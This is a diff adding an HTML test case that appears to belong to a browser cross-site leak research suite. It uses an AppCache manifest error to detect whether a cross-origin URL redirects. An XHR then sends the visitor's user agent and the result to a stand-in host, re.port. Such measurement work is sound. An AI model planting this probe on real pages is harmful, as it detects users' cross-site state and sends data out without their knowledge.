@@ -1,0 +1,25 @@
+<html manifest="/manifest.appcache?url=https://leak.test/server_redirect/1/">
+<head>
+    <meta http-equiv="origin-trial" content="ApnU4ZkKtj+MntjhL2sw/V+MZYXIPEAT9VkTxJaqZNtjxIH1OTsEYyilVOVBTvL3C3WHljP1Xm+xZu61F82kyQAAAABLeyJvcmlnaW4iOiJodHRwczovL2F0dGFjay5lcjo0NDMiLCJmZWF0dXJlIjoiQXBwQ2FjaGUiLCJleHBpcnkiOjE2MzM0NzgzOTl9">
+</head>
+    <script>
+        window.onload = function() {
+            var redirect = false;
+
+            applicationCache.onerror = function () {
+                    console.log("redirect");
+                    redirect = true;
+                };
+
+            function report() {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "https://re.port/case11_redirect.json/" + btoa(JSON.stringify({
+                    "user-agent": navigator.userAgent,
+                    "redirect": redirect
+                })));
+                xhr.send();
+            }
+            setTimeout(report, 4000);
+        }
+    </script>
+</html>
